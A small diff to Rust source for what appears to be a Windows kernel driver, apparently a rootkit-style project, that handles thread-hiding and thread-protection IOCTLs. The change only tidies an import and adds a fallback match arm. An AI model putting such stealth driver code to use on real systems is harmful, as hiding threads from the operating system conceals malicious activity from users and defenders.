@@ -2,11 +2,7 @@ use {
     alloc::boxed::Box, 
     core::sync::atomic::{AtomicPtr, Ordering},
     wdk_sys::{IO_STACK_LOCATION, IRP, STATUS_SUCCESS},
-    shadowx::{
-        Thread,
-        THREAD_INFO_HIDE,
-        error::ShadowError,
-    },
+    shadowx::{Thread, THREAD_INFO_HIDE, error::ShadowError},
 };
 
 use {
@@ -85,6 +81,8 @@ pub fn register_thread_ioctls(ioctls: &mut IoctlManager) {
                 Options::Hide => Thread::enumerate_hide_threads(),
                 #[cfg(not(feature = "mapper"))]
                 Options::Protection => shadowx::ThreadCallback::enumerate_protection_thread(),
+                #[cfg(feature = "mapper")]
+                _ => alloc::vec::Vec::new(),
             };
 
             // Fill the output buffer with the enumerated threads' information.
